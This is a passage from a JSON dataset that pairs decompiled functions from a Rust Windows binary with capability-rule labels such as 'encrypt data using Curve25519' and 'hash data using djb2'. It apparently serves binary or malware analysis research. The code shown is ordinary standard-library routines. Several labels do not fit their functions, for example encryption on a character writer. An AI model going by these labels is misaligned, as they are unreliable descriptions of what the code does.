{\n            cVar5 = '7';\n            if ((uVar8 & 0xf) < 10) {\n                cVar5 = '0';\n            }\n            puVar7[-1] = cVar5 + (uVar8 & 0xf);\n            puVar7 = puVar7 + -1;\n            iVar4 = iVar4 + 1;\n            bVar2 = 0xf < uVar8;\n            uVar8 = uVar8 >> 4;\n        } while (bVar2);\n    }\n    else {\n        iVar4 = 0;\n        uVar8 = *puVar1;\n        do {\n            cVar5 = 'W';\n            if ((uVar8 & 0xf) < 10) {\n                cVar5 = '0';\n            }\n            puVar6[-1] = cVar5 + (uVar8 & 0xf);\n            puVar6 = puVar6 + -1;\n            iVar4 = iVar4 + 1;\n            bVar2 = 0xf < uVar8;\n            uVar8 = uVar8 >> 4;\n        } while (bVar2);\n    }\n    if (0x80 < 0x80U - iVar4) {\n        dbg.slice_start_index_len_fail(0x80U - iVar4, 0x80);\n        do {\n            invalidInstructionException();\n        } while( true );\n    }\n    arg3 = 0x44910b;\n    arg4 = 2;\ncode_r0x0040ac49:\n    dbg.pad_integral(arg2, CONCAT71(arg2 >> 8, 1), arg3, arg4);\n    return;\n}\n",
        "token_count": 1002
    },
    "ff6e31fb": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2",
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nvoid sym.core::fmt::num::imp::__impl_core::fmt::Display_for_i32_::fmt::hff6e31fbf33ddf61(int32_t *arg1, ulong arg2)\n\n{\n    int32_t iVar1;\n    bool bVar2;\n    int64_t iVar3;\n    char cVar4;\n    uint64_t uVar5;\n    uint32_t uVar6;\n    int64_t iVar7;\n    uint32_t uVar8;\n    uint64_t uVar9;\n    ushort uStack67;\n    char acStack64 [40];\n    \n    // core::fmt::num::imp::_<impl core::fmt::Display for i32>::fmt::hff6e31fbf33ddf61\n    iVar1 = *arg1;\n    uVar9 = iVar1;\n    uVar5 = uVar9 & 0xffffffff;\n    if (uVar9 < 0) {\n        uVar5 = -uVar9;\n    }\n    iVar3 = 0x27;\n    if (9999 < uVar5) {\n        uVar9 = uVar5;\n        iVar7 = 0x27;\n        do {\n            uVar5 = uVar9 / 10000;\n            uVar8 = uVar9 + uVar5 * -10000;\n            uVar6 = ((uVar8 & 0xffff) >> 2) / 0x19;\n            iVar3 = iVar7 + -4;\n            *(&uStack67 + iVar7) =\n                 *(\n                  str.00010203040506070809101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899\n                  + uVar6 * 2);\n            *(&stack0xffffffffffffffbf + iVar7) =\n                 *(\n                  str.00010203040506070809101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899\n                  + (uVar8 + uVar6 * -100 & 0xffff) * 2);\n            bVar2 = 99999999 < uVar9;\n            uVar9 = uVar5;\n            iVar7 = iVar3;\n        } while (bVar2);\n    }\n    uVar9 = uVar5;\n    if (99 < uVar5) {\n        uVar6 = ((uVar5 & 0xffff) >> 2) / 0x19;\n        uVar9 = uVar6;\n        *(&stack0xffffffffffffffbf + iVar3) =\n             *(\n              str.00010203040506070809101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899\n              + (uVar5 + uVar6 * -100 & 0xffff) * 2);\n        iVar3 = iVar3 + -2;\n    }\n    if (uVar9 < 10) {\n        cVar4 = uVar9;\n        uVar9 = uVar9 & 0xffffffffffffff00;\n        (&stack0xffffffffffffffbf)[iVar3 + 1] = cVar4 + '0';\n    }\n    else {\n        *(&stack0xffffffffffffffbf + iVar3) =\n             *(\n              str.00010203040506070809101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899\n              + uVar9 * 2);\n    }\n    dbg.pad_integral(arg2, uVar9 & 0xffffffffffffff00 | -1 < iVar1, \n                     \"cannot access a Thread Local Storage value during or after destruction/rustc/a55dd71d5fb0ec5a6a3a9e8c27b2127ba491ce52\\\\library\\\\std\\\\src\\\\thread\\\\local.rs\"\n                     , 0);\n    return;\n}\n",
        "token_count": 981
    },
    "2eb42dbc": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nvoid sym.core::fmt::num::__impl_core::fmt::UpperHex_for_i8_::fmt::h2eb42dbc5cdc3e52(ulong arg1, ulong arg2)\n\n{\n    uint8_t uVar1;\n    char cVar3;\n    uchar *puVar4;\n    int64_t iVar5;\n    uint64_t uVar6;\n    char cStack9;\n    uint8_t uVar2;\n    \n    // core::fmt::num::_<impl core::fmt::UpperHex for i8>::fmt::h2eb42dbc5cdc3e52\n    puVar4 = &stack0xfffffffffffffff8;\n    iVar5 = 0;\n    uVar6 = arg1;\n    do {\n        uVar2 = arg1;\n        uVar1 = uVar2 & 0xf;\n        uVar6 = uVar6 >> 4 & 0xf;\n        cVar3 = '7';\n        if (uVar1 < 10) {\n            cVar3 = '0';\n        }\n        puVar4[-1] = cVar3 + uVar1;\n        puVar4 = puVar4 + -1;\n        iVar5 = iVar5 + 1;\n        arg1._0_4_ = uVar6;\n    } while (0xf < uVar2);\n    if (0x80U - iVar5 < 0x81) {\n        dbg.pad_integral(arg2, CONCAT71(arg2 >> 8, 1), 0x44910b, 2);\n        return;\n    }\n    dbg.slice_start_index_len_fail(0x80U - iVar5, 0x80);\n    do {\n        invalidInstructionException();\n    } while( true );\n}\n",
        "token_count": 371
    },
    "9b3463d8": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nvoid sym.core::fmt::num::__impl_core::fmt::LowerHex_for_i64_::fmt::h9b3463d8035a0395(uint64_t arg1, ulong arg2)\n\n{\n    bool bVar1;\n    uint8_t uVar2;\n    char cVar3;\n    uchar *puVar4;\n    int64_t iVar5;\n    char cStack9;\n    \n    // core::fmt::num::_<impl core::fmt::LowerHex for i64>::fmt::h9b3463d8035a0395\n    puVar4 = &stack0xfffffffffffffff8;\n    iVar5 = 0;\n    do {\n        uVar2 = arg1 & 0xf;\n        cVar3 = 'W';\n        if (uVar2 < 10) {\n            cVar3 = '0';\n        }\n        puVar4[-1] = cVar3 + uVar2;\n        puVar4 = puVar4 + -1;\n        iVar5 = iVar5 + 1;\n        bVar1 = 0xf < arg1;\n        arg1 = arg1 >> 4;\n    } while (bVar1);\n    if (0x80U - iVar5 < 0x81) {\n        dbg.pad_integral(arg2, CONCAT71(arg2 >> 8, 1), 0x44910b, 2);\n        return;\n    }\n    dbg.slice_start_index_len_fail(0x80U - iVar5, 0x80);\n    do {\n        invalidInstructionException();\n    } while( true );\n}\n",
        "token_count": 337
    },
    "a6ae8691": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nvoid sym.core::fmt::num::__impl_core::fmt::UpperHex_for_i64_::fmt::ha6ae86917acc127e(uint64_t arg1, ulong arg2)\n\n{\n    bool bVar1;\n    uint8_t uVar2;\n    char cVar3;\n    uchar *puVar4;\n    int64_t iVar5;\n    char cStack9;\n    \n    // core::fmt::num::_<impl core::fmt::UpperHex for i64>::fmt::ha6ae86917acc127e\n    puVar4 = &stack0xfffffffffffffff8;\n    iVar5 = 0;\n    do {\n        uVar2 = arg1 & 0xf;\n        cVar3 = '7';\n        if (uVar2 < 10) {\n            cVar3 = '0';\n        }\n        puVar4[-1] = cVar3 + uVar2;\n        puVar4 = puVar4 + -1;\n        iVar5 = iVar5 + 1;\n        bVar1 = 0xf < arg1;\n        arg1 = arg1 >> 4;\n    } while (bVar1);\n    if (0x80U - iVar5 < 0x81) {\n        dbg.pad_integral(arg2, CONCAT71(arg2 >> 8, 1), 0x44910b, 2);\n        return;\n    }\n    dbg.slice_start_index_len_fail(0x80U - iVar5, 0x80);\n    do {\n        invalidInstructionException();\n    } while( true );\n}\n",
        "token_count": 331
    },
    "c88ef28a": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nvoid sym._ZN4core3fmt3num50__LT_impl_u20_core..fmt..Debug_u20_for_u20_i32_GT_3fmt17hc88ef28abbe66b1eE.267\n               (uint32_t *arg1, int64_t arg2)\n\n{\n    bool bVar1;\n    uint8_t uVar2;\n    int64_t iVar3;\n    char cVar4;\n    uint64_t uVar5;\n    uint32_t uVar6;\n    int64_t iVar7;\n    uint32_t uVar8;\n    uint64_t uVar9;\n    uchar *puVar10;\n    uchar *puVar11;\n    uint32_t uVar12;\n    ushort uStack67;\n    char acStack64 [40];\n    \n    puVar10 = &stack0xfffffffffffffff8;\n    puVar11 = &stack0xfffffffffffffff8;\n    if ((*(arg2 + 0x30) & 0x10) == 0) {\n        if ((*(arg2 + 0x30) & 0x20) == 0) {\n            uVar12 = *arg1;\n            uVar9 = uVar12;\n            uVar5 = uVar9 & 0xffffffff;\n            if (uVar9 < 0) {\n                uVar5 = -uVar9;\n            }\n            iVar3 = 0x27;\n            if (9999 < uVar5) {\n                uVar9 = uVar5;\n                iVar7 = 0x27;\n                do {\n                    uVar5 = uVar9 / 10000;\n                    uVar8 = uVar9 + uVar5 * -10000;\n                    uVar6 = ((uVar8 & 0xffff) >> 2) / 0x19;\n                    iVar3 = iVar7 + -4;\n                    *(&uStack67 + iVar7) =\n                         *(\n                          str.00010203040506070809101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899\n                          + uVar6 * 2);\n                    *(&stack0xffffffffffffffbf + iVar7) =\n                         *(\n                          str.00010203040506070809101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899\n                          + (uVar8 + uVar6 * -100 & 0xffff) * 2);\n                    bVar1 = 99999999 < uVar9;\n                    uVar9 = uVar5;\n                    iVar7 = iVar3;\n                } while (bVar1);\n            }\n            uVar9 = uVar5;\n            if (99 < uVar5) {\n                uVar6 = ((uVar5 & 0xffff) >> 2) / 0x19;\n                uVar9 = uVar6;\n                *(&stack0xffffffffffffffbf + iVar3) =\n                     *(\n                      str.00010203040506070809101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899\n                      + (uVar5 + uVar6 * -100 & 0xffff) * 2);\n                iVar3 = iVar3 + -2;\n            }\n            if (uVar9 < 10) {\n                cVar4 = uVar9;\n                uVar9 = uVar9 & 0xffffffffffffff00;\n                (&stack0xffffffffffffffbf)[iVar3 + 1] = cVar4 + '0';\n            }\n            else {\n                *(&stack0xffffffffffffffbf + iVar3) =\n                     *(\n                      str.00010203040506070809101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899\n                      + uVar9 * 2);\n            }\n            dbg.pad_integral(arg2, uVar9 & 0xffffffffffffff00 | -1 < uVar12, \n                             \"cannot access a Thread Local Storage value during or after destruction/rustc/a55dd71d5fb0ec5a6a3a9e8c27b2127ba491ce52\\\\library\\\\std\\\\src\\\\thread\\\\local.rs\"\n                             , 0);\n            return;\n        }\n        iVar3 = 0;\n        uVar12 = *arg1;\n        do {\n            uVar2 = uVar12 & 0xf;\n            cVar4 = '7';\n            if (uVar2 < 10) {\n                cVar4 = '0';\n            }\n            puVar11[-1] = cVar4 + uVar2;\n            puVar11 = puVar11 + -1;\n            iVar3 = iVar3 + 1;\n            bVar1 = 0xf < uVar12;\n            uVar12 = uVar12 >> 4;\n        } while (bVar1);\n    }\n    else {\n        iVar3 = 0;\n        uVar12 = *arg1;\n        do {\n            uVar2 = uVar12 & 0xf;\n            cVar4 = 'W';\n            if (uVar2 < 10) {\n                cVar4 = '0';\n            }\n            puVar10[-1] = cVar4 + uVar2;\n            puVar10 = puVar10 + -1;\n            iVar3 = iVar3 + 1;\n            bVar1 = 0xf < uVar12;\n            uVar12 = uVar12 >> 4;\n        } while (bVar1);\n    }\n    if (0x80 < 0x80U - iVar3) {\n        dbg.slice_start_index_len_fail(0x80U - iVar3, 0x80);\n        do {\n            invalidInstructionException();\n        } while( true );\n    }\n    dbg.pad_integral(arg2, CONCAT71(arg2 >> 8, 1), 0x44910b, 2);\n    return;\n}\n",
        "token_count": 1419
    },
    "6824702a": {
        "rules": [
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5",
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5",
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5",
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b",
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b",
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b"
        ],
        "decompiled_code": "\nvoid sym._crossbeam_epoch::internal::Bag_as_core::ops::drop::Drop_::drop::h6824702aae2f0818(int64_t arg1)\n\n{\n    code **ppcVar1;\n    uint *puVar2;\n    uint64_t arg1_00;\n    code *pcVar3;\n    uint uVar4;\n    uint uVar5;\n    uint uVar6;\n    int64_t iVar7;\n    uint uStack64;\n    uint uStack60;\n    uint uStack56;\n    uint uStack52;\n    uint uStack48;\n    uint uStack44;\n    \n    // <crossbeam_epoch::internal::Bag as core::ops::drop::Drop>::drop::h6824702aae2f0818\n    arg1_00 = *(arg1 + 0x800);\n    if (arg1_00 < 0x41) {\n        for (iVar7 = 0; uVar6 = *0x445b84,  uVar5 = *0x445b80,  uVar4 = *0x445b7c,  arg1_00 << 5 != iVar7;\n            iVar7 = iVar7 + 0x20) {\n            ppcVar1 = arg1 + iVar7;\n            pcVar3 = *ppcVar1;\n            uStack64 = *(ppcVar1 + 1);\n            uStack60 = *(ppcVar1 + 0xc);\n            puVar2 = arg1 + 0x10 + iVar7;\n            uStack56 = *puVar2;\n            uStack52 = puVar2[1];\n            uStack48 = puVar2[2];\n            uStack44 = puVar2[3];\n            puVar2 = arg1 + 0x10 + iVar7;\n            *puVar2 = *0x445b78;\n            puVar2[1] = uVar4;\n            puVar2[2] = uVar5;\n            puVar2[3] = uVar6;\n            uVar6 = *0x445b74;\n            uVar5 = *0x445b70;\n            uVar4 = *0x445b6c;\n            puVar2 = arg1 + iVar7;\n            *puVar2 = *0x445b68;\n            puVar2[1] = uVar4;\n            puVar2[2] = uVar5;\n            puVar2[3] = uVar6;\n            (*pcVar3)(&uStack64);\n        }\n        return;\n    }\n    dbg.slice_end_index_len_fail(arg1_00, 0x40);\n    do {\n        invalidInstructionException();\n    } while( true );\n}\n",
        "token_count": 587
    },
    "50a2d7bf": {
        "rules": [
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5",
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b"
        ],
        "decompiled_code": "\nvoid sym.crossbeam_epoch::internal::Local::defer::h50a2d7bf5314df47(int64_t arg1, int64_t *arg2)\n\n{\n    uint *puVar1;\n    int64_t iVar2;\n    uint uVar3;\n    uint uVar4;\n    uint uVar5;\n    int64_t iVar6;\n    \n    // crossbeam_epoch::internal::Local::defer::h50a2d7bf5314df47\n    iVar2 = *arg2;\n    while( true ) {\n        if (*(arg1 + 0x818) < 0x40) {\n            iVar6 = *(arg1 + 0x818) * 0x20;\n            *(arg1 + 0x18 + iVar6) = iVar2;\n            uVar3 = *(arg2 + 0xc);\n            uVar4 = *(arg2 + 2);\n            uVar5 = *(arg2 + 0x14);\n            puVar1 = arg1 + 0x20 + iVar6;\n            *puVar1 = *(arg2 + 1);\n            puVar1[1] = uVar3;\n            puVar1[2] = uVar4;\n            puVar1[3] = uVar5;\n            *(arg1 + 0x30 + iVar6) = arg2[3];\n            *(arg1 + 0x818) = *(arg1 + 0x818) + 1;\n            return;\n        }\n        if (iVar2 == 0) break;\n        sym.crossbeam_epoch::internal::Global::push_bag::h676195a937628f8d(*(arg1 + 0x10) + 0x80);\n    }\n    return;\n}\n",
        "token_count": 376
    },
    "3c063cbc": {
        "rules": [
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5",
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b"
        ],
        "decompiled_code": "\nint64_t sym.hashbrown::raw::RawTable_T_A_::find::h3c063cbcc14ed5aa(int64_t arg1, int64_t arg2, ulong arg3)\n\n{\n    int64_t iVar1;\n    ulong uStack32;\n    ulong *puStack24;\n    int64_t iStack16;\n    \n    // hashbrown::raw::RawTable<T,A>::find::h3c063cbcc14ed5aa\n    puStack24 = &uStack32;\n    uStack32 = arg3;\n    iStack16 = arg1;\n    iVar1 = sym.hashbrown::raw::RawTableInner_A_::find_inner::hf355b5523df09d82(arg1, arg2, &puStack24, 0x44bf00);\n    if (iVar1 != 0) {\n        iVar1 = *(arg1 + 8) + arg2 * -0x20;\n    }\n    return iVar1;\n}\n",
        "token_count": 209
    },
    "f6a7ff3b": {
        "rules": [
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5",
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b"
        ],
        "decompiled_code": "\nuint64_t sym.hashbrown::raw::RawTable_T_A_::find::__u7b__u7b_closure_u7d__u7d_::hf6a7ff3b28e18a68\n                   (ulong *arg1, int64_t arg2)\n\n{\n    uint64_t uVar1;\n    int64_t iVar2;\n    \n    // hashbrown::raw::RawTable<T,A>::find::_$u7b$$u7b$closure$u7d$$u7d$::hf6a7ff3b28e18a68\n    iVar2 = arg2 * -0x20 + *(arg1[1] + 8);\n    if ((**arg1)[2] == *(iVar2 + -0x10)) {\n        uVar1 = sub.msvcrt.dll_memcmp(***arg1, *(iVar2 + -0x20));\n        uVar1 = uVar1 & 0xffffffffffffff00 | uVar1 == 0;\n    }\n    else {\n        uVar1 = 0;\n    }\n    return uVar1;\n}\n",
        "token_count": 237
    },
    "844dff3e": {
        "rules": [
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5",
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b"
        ],
        "decompiled_code": "\nvoid sym.hashbrown::raw::RawTable_T_A_::reserve_rehash::__u7b__u7b_closure_u7d__u7d_::h844dff3ec4e13623\n               (int64_t **arg1, int64_t arg2, int64_t arg3)\n\n{\n    int64_t iVar1;\n    uchar uStack81;\n    uint64_t uStack80;\n    uint64_t uStack72;\n    ulong uStack64;\n    uint64_t uStack56;\n    uint64_t uStack48;\n    uint64_t uStack40;\n    uint64_t uStack32;\n    uchar auStack24 [16];\n    \n    // hashbrown::raw::RawTable<T,A>::reserve_rehash::_$u7b$$u7b$closure$u7d$$u7d$::h844dff3ec4e13623\n    iVar1 = arg3 * -0x20 + *(arg2 + 8);\n    uStack80 = ***arg1;\n    uStack72 = (**arg1)[1];\n    uStack56 = uStack80 ^ 0x736f6d6570736575;\n    uStack40 = uStack72 ^ 0x646f72616e646f6d;\n    uStack48 = uStack80 ^ 0x6c7967656e657261;\n    auStack24 = ZEXT816(0);\n    uStack64 = 0;\n    uStack32 = uStack72 ^ 0x7465646279746573;\n    sym._core::hash::sip::Hasher_S__as_core::hash::Hasher_::write::h8176f034ddda3e7a\n              (&uStack80, *(iVar1 + -0x20), *(iVar1 + -0x10));\n    uStack81 = 0xff;\n    sym._core::hash::sip::Hasher_S__as_core::hash::Hasher_::write::h8176f034ddda3e7a(&uStack80, &uStack81, 1);\n    sym._std::collections::hash::map::DefaultHasher_as_core::hash::Hasher_::finish::h91b90874a8673c3f(&uStack80);\n    return;\n}\n",
        "token_count": 492
    },
    "c42f239b": {
        "rules": [
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5",
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b"
        ],
        "decompiled_code": "\nint64_t sym.hashbrown::raw::RawTable_T_A_::find::hc42f239b2befc81e(int64_t arg1, int64_t arg2, ulong arg3)\n\n{\n    int64_t iVar1;\n    ulong uStack32;\n    ulong *puStack24;\n    int64_t iStack16;\n    \n    // hashbrown::raw::RawTable<T,A>::find::hc42f239b2befc81e\n    puStack24 = &uStack32;\n    uStack32 = arg3;\n    iStack16 = arg1;\n    iVar1 = sym.hashbrown::raw::RawTableInner_A_::find_inner::hf355b5523df09d82(arg1, arg2, &puStack24, 0x44bf28);\n    if (iVar1 != 0) {\n        iVar1 = *(arg1 + 8) + arg2 * -0x20;\n    }\n    return iVar1;\n}\n",
        "token_count": 209
    },
    "0040b828": {
        "rules": [
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5",
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b"
        ],
        "decompiled_code": "\nvoid sym.hashbrown::raw::RawTable_T_A_::reserve_rehash::__u7b__u7b_closure_u7d__u7d_::h0040b82842a689f1\n               (int64_t **arg1, int64_t arg2, int64_t arg3)\n\n{\n    int64_t iVar1;\n    uchar uStack81;\n    uint64_t uStack80;\n    uint64_t uStack72;\n    ulong uStack64;\n    uint64_t uStack56;\n    uint64_t uStack48;\n    uint64_t uStack40;\n    uint64_t uStack32;\n    uchar auStack24 [16];\n    \n    // hashbrown::raw::RawTable<T,A>::reserve_rehash::_$u7b$$u7b$closure$u7d$$u7d$::h0040b82842a689f1\n    iVar1 = arg3 * -0x20 + *(arg2 + 8);\n    uStack80 = ***arg1;\n    uStack72 = (**arg1)[1];\n    uStack56 = uStack80 ^ 0x736f6d6570736575;\n    uStack40 = uStack72 ^ 0x646f72616e646f6d;\n    uStack48 = uStack80 ^ 0x6c7967656e657261;\n    auStack24 = ZEXT816(0);\n    uStack64 = 0;\n    uStack32 = uStack72 ^ 0x7465646279746573;\n    sym._core::hash::sip::Hasher_S__as_core::hash::Hasher_::write::h8176f034ddda3e7a\n              (&uStack80, *(iVar1 + -0x20), *(iVar1 + -0x10));\n    uStack81 = 0xff;\n    sym._core::hash::sip::Hasher_S__as_core::hash::Hasher_::write::h8176f034ddda3e7a(&uStack80, &uStack81, 1);\n    sym._std::collections::hash::map::DefaultHasher_as_core::hash::Hasher_::finish::h91b90874a8673c3f(&uStack80);\n    return;\n}\n",
        "token_count": 494
    },
    "127771c7": {
        "rules": [
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5",
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b"
        ],
        "decompiled_code": "\nuint64_t sym.hashbrown::raw::RawTable_T_A_::find::__u7b__u7b_closure_u7d__u7d_::h127771c7a2c5e1c1\n                   (ulong *arg1, int64_t arg2)\n\n{\n    uint64_t uVar1;\n    int64_t iVar2;\n    \n    // hashbrown::raw::RawTable<T,A>::find::_$u7b$$u7b$closure$u7d$$u7d$::h127771c7a2c5e1c1\n    iVar2 = arg2 * -0x20 + *(arg1[1] + 8);\n    if ((**arg1)[2] == *(iVar2 + -0x10)) {\n        uVar1 = sub.msvcrt.dll_memcmp(***arg1, *(iVar2 + -0x20));\n        uVar1 = uVar1 & 0xffffffffffffff00 | uVar1 == 0;\n    }\n    else {\n        uVar1 = 0;\n    }\n    return uVar1;\n}\n",
        "token_count": 239
    },
    "d7ccc962": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\nulong sym._core::str::iter::EncodeUtf16_as_core::iter::traits::iterator::Iterator_::next::hd7ccc9625ce8f5a7\n                (uint8_t **arg1)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    uint8_t *puVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    \n    // <core::str::iter::EncodeUtf16 as core::iter::traits::iterator::Iterator>::next::hd7ccc9625ce8f5a7\n    if (*(arg1 + 2) == 0) {\n        puVar3 = *arg1;\n        if (puVar3 == arg1[1]) {\n            return 0;\n        }\n        *arg1 = puVar3 + 1;\n        uVar1 = *puVar3;\n        if (uVar1 < '\\0') {\n            uVar4 = uVar1 & 0x1f;\n            *arg1 = puVar3 + 2;\n            uVar2 = puVar3[1];\n            if (uVar1 < 0xe0) {\n                uVar5 = uVar4 << 6 | uVar2 & 0x3f;\n            }\n            else {\n                *arg1 = puVar3 + 3;\n                uVar5 = puVar3[2] & 0x3f | (uVar2 & 0x3f) << 6;\n                if (uVar1 < 0xf0) {\n                    uVar5 = uVar5 | uVar4 << 0xc;\n                }\n                else {\n                    *arg1 = puVar3 + 4;\n                    uVar5 = puVar3[3] & 0x3f | uVar5 << 6 | (uVar1 & 7) << 0x12;\n                    if (uVar5 == 0x110000) {\n                        return 0;\n                    }\n                }\n            }\n            if (0xffff < uVar5) {\n                *(arg1 + 2) = uVar5 & 0x3ff | 0xdc00;\n                return 1;\n            }\n        }\n    }\n    else {\n        *(arg1 + 2) = 0;\n    }\n    return 1;\n}\n",
        "token_count": 507
    },
    "255a930e": {
        "rules": [
            "encrypt data using Curve25519/ee72fa54c57a4f96b956b5431c8943ad"
        ],
        "decompiled_code": "\nvoid sym.core::fmt::Write::write_char::h255a930e202e34bd(ulong arg1, ulong arg2)\n\n{\n    uchar uVar1;\n    ulong arg3;\n    uint32_t uStack4;\n    \n    // core::fmt::Write::write_char::h255a930e202e34bd\n    uVar1 = arg2;\n    if (arg2 < 0x80) {\n        uStack4 = arg2 & 0xff;\n        arg3 = 1;\n    }\n    else if (arg2 < 0x800) {\n        uStack4 = (CONCAT11(uVar1, arg2 >> 6) | 0xc0) & 0xffff3fff | 0x8000;\n        arg3 = 2;\n    }\n    else if (arg2 < 0x10000) {\n        uStack4 = (CONCAT12(uVar1, CONCAT11(arg2 >> 6, arg2 >> 0xc)) & 0xff3fff | 0x80e0) & 0xff3fffff | 0x800000;\n        arg3 = 3;\n    }\n    else {\n        uStack4 = CONCAT13(uVar1, CONCAT12(arg2 >> 6, CONCAT11(arg2 >> 0xc, arg2 >> 0x12))) & 0x3f3f3f07 | 0x808080f0;\n        arg3 = 4;\n    }\n    dbg.write_str(arg1, &uStack4, arg3);\n    return;\n}\n",
        "token_count": 339
    },
    "951636c3": {
        "rules": [
            "encrypt data using Curve25519/ee72fa54c57a4f96b956b5431c8943ad"
        ],
        "decompiled_code": "\nuint64_t sym.core::fmt::Write::write_char::h951636c318130d27(ulong *arg1, ulong arg2)\n\n{\n    uint64_t uVar1;\n    uint64_t uVar2;\n    uchar uVar3;\n    ulong arg3;\n    uint32_t uStack20;\n    \n    // core::fmt::Write::write_char::h951636c318130d27\n    uVar3 = arg2;\n    if (arg2 < 0x80) {\n        uStack20 = arg2 & 0xff;\n        arg3 = 1;\n    }\n    else if (arg2 < 0x800) {\n        uStack20 = (CONCAT11(uVar3, arg2 >> 6) | 0xc0) & 0xffff3fff | 0x8000;\n        arg3 = 2;\n    }\n    else if (arg2 < 0x10000) {\n        uStack20 = (CONCAT12(uVar3, CONCAT11(arg2 >> 6, arg2 >> 0xc)) & 0xff3fff | 0x80e0) & 0xff3fffff | 0x800000;\n        arg3 = 3;\n    }\n    else {\n        uStack20 = CONCAT13(uVar3, CONCAT12(arg2 >> 6, CONCAT11(arg2 >> 0xc, arg2 >> 0x12))) & 0x3f3f3f07 | 0x808080f0;\n        arg3 = 4;\n    }\n    uVar1 = dbg.write_all<std::sys::windows::stdio::Stderr>(*arg1, &uStack20, arg3);\n    uVar2 = uVar1;\n    if (uVar1 != 0) {\n        if (arg1[1] != 0) {\n            uVar2 = dbg.drop_in_place<std::io::error::Error>(arg1[1]);\n        }\n        arg1[1] = uVar1;\n    }\n    return uVar2 & 0xffffffffffffff00 | uVar1 != 0;\n}\n",
        "token_count": 457
    },
    "a0985864": {
        "rules": [
            "encrypt data using Curve25519/ee72fa54c57a4f96b956b5431c8943ad"
        ],
        "decompiled_code": "\nuint64_t sym.core::fmt::Write::write_char::ha0985864e462a05c(ulong *arg1, ulong arg2)\n\n{\n    uint64_t uVar1;\n    uint64_t uVar2;\n    uchar uVar3;\n    ulong arg3;\n    uint32_t uStack20;\n    \n    // core::fmt::Write::write_char::ha0985864e462a05c\n    uVar3 = arg2;\n    if (arg2 < 0x80) {\n        uStack20 = arg2 & 0xff;\n        arg3 = 1;\n    }\n    else if (arg2 < 0x800) {\n        uStack20 = (CONCAT11(uVar3, arg2 >> 6) | 0xc0) & 0xffff3fff | 0x8000;\n        arg3 = 2;\n    }\n    else if (arg2 < 0x10000) {\n        uStack20 = (CONCAT12(uVar3, CONCAT11(arg2 >> 6, arg2 >> 0xc)) & 0xff3fff | 0x80e0) & 0xff3fffff | 0x800000;\n        arg3 = 3;\n    }\n    else {\n        uStack20 = CONCAT13(uVar3, CONCAT12(arg2 >> 6, CONCAT11(arg2 >> 0xc, arg2 >> 0x12))) & 0x3f3f3f07 | 0x808080f0;\n        arg3 = 4;\n    }\n    uVar1 = dbg.write_all(**arg1, &uStack20, arg3);\n    uVar2 = uVar1;\n    if (uVar1 != 0) {\n        if (arg1[1] != 0) {\n            uVar2 = dbg.drop_in_place<std::io::error::Error>(arg1[1]);\n        }\n        arg1[1] = uVar1;\n    }\n    return uVar2 & 0xffffffffffffff00 | uVar1 != 0;\n}\n",
        "token_count": 449
    },
    "798c1894": {
        "rules": [
            "encrypt data using Curve25519/ee72fa54c57a4f96b956b5431c8943ad"
        ],
